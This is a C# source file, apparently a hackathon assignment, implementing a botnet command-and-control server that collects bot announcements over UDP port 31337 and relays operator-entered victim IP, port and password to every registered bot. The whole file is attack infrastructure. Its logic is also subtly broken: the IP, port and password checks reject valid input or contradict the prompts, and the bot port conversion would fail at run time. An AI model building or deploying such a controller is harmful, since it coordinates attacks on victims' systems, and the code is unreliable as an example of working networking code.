using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace HackatonAssignment
{
    class CnC
    {

        private const int listenPort = 31337;
        private List<Tuple<string,byte[]>> botList;       
        private bool doneListenToBots;
        private bool doneListenToUserAttackCommands;
        private UdpClient listener;
        private string serverName;

        public CnC()
        {
            this.botList = new List<Tuple<string, byte[]>>();
            this.doneListenToBots = false;
            this.doneListenToUserAttackCommands = false;
            this.serverName = "ConditionZero";
        }


        public void start()
        {
            this.listener = new UdpClient(listenPort);
            Console.WriteLine("Command and control server " + serverName + " active");
            Thread botsAnnounceListner = new Thread( UDPBroadcastListen );
            Thread userAttackCommandListner = new Thread(getUserAttackRequest);
            botsAnnounceListner.Start();
            userAttackCommandListner.Start();
            botsAnnounceListner.Join();
            userAttackCommandListner.Join();
            listener.Close();
        }



        private void UDPBroadcastListen()
        {
            IPEndPoint endPoint = new IPEndPoint(IPAddress.Any, listenPort);
            try
            {
                while (!doneListenToBots)
                {
                    //recive 1 bot broadcast message 

                    byte[] receive_port_as_byte_array = listener.Receive(ref endPoint);
                    Console.WriteLine("Received a broadcast from bot: ", endPoint.ToString()); 
                    
                    //check bot listenning PORT validty

                    if (receive_port_as_byte_array.Length != 2 || !isLegalPort(receive_port_as_byte_array))
                    {
                        Console.WriteLine("Ignoring illeagel bot announce");
                        continue;
                    }

                    //add the bot info to the bot list

                    Tuple<string, byte[]> botEntry = new Tuple<string, byte[]>(endPoint.Address.ToString(), receive_port_as_byte_array);
                    botList.Add(botEntry);
                    

                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }

        }


        private void getUserAttackRequest()
        {
            while (!doneListenToUserAttackCommands)
            {

                //recive IP and check Validity

                Console.WriteLine("Enter Victim IP address and press ENTER");
                string victimIp = Console.ReadLine();
                byte[] vip = Encoding.ASCII.GetBytes(victimIp);
                if (vip.Length != 4 || !isLegalIp(vip))
                {
                    Console.WriteLine("Illegal IP address");
                    continue;
                }

                //recive PORT and check Validty

                Console.WriteLine("Enter Victim Port and press ENTER");
                string victimPort = Console.ReadLine();
                byte[] vport = Encoding.ASCII.GetBytes(victimPort);
                if (vport.Length != 2 || !isLegalPort(vport))
                {
                    Console.WriteLine("Illegal Port");
                    continue;
                }

                //recive PASSWORD and check Validty

                Console.WriteLine("Enter Victim Password of 6 digits and press ENTER");
                string victimPassword = Console.ReadLine();
                byte[] vpass = Encoding.ASCII.GetBytes(victimPassword);
                if (vpass.Length != 6 || !isLegalPassword(vpass))
                {
                    Console.WriteLine("Illegal Password");
                    continue;
                }

                Console.WriteLine("”attacking victim on IP " + victimIp + ", " + victimPort + " with " + botList.Count + " bots");

                // activate all the bots in botList

                foreach (Tuple<string, byte[]> botEntry in botList)
                {
                    IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(botEntry.Item1), BitConverter.ToInt32(botEntry.Item2, 0));

                    //prepare the UDP packet

                    byte[] servName = Encoding.ASCII.GetBytes(serverName);
                    byte[] sendBuffer = new byte[vip.Length + vport.Length + vpass.Length + 32];
                    vip.CopyTo(sendBuffer, 0);
                    vport.CopyTo(sendBuffer, vip.Length);
                    vpass.CopyTo(sendBuffer, vip.Length + vport.Length);
                    servName.CopyTo(sendBuffer, vip.Length + vport.Length + vpass.Length);

                    //finaly send the packet

                    listener.Send(sendBuffer,sendBuffer.Length, endPoint);
                }


            }


        }


        public void stopReciveInputFromUser()
        {
            this.doneListenToUserAttackCommands = true;
        }

        public void stopReciveBotAnnounce()
        {
            this.doneListenToBots = true;
        }

        private bool isLegalIp(byte[] b_str)
        {
            string str = Encoding.ASCII.GetString(b_str);
            foreach (char c in str)
            {
                if ((c < '0' || c > '9') && (c != '.'))
                    return false;
            }

            return true;
        }

        private bool isLegalPassword(byte[] b_str)
        {
            string str = Encoding.ASCII.GetString(b_str);
            foreach (char c in str)
            {
                if (c < 'a' || c > 'z')
                    return false;
            }

            return true;

        }


        private bool isLegalPort(byte[] b_str)
        {
            string str = Encoding.ASCII.GetString(b_str);
            foreach (char c in str)
            {
                if ((c< '0' || c> '9'))
                    return false;
            }

            return true;
        }

    }
}




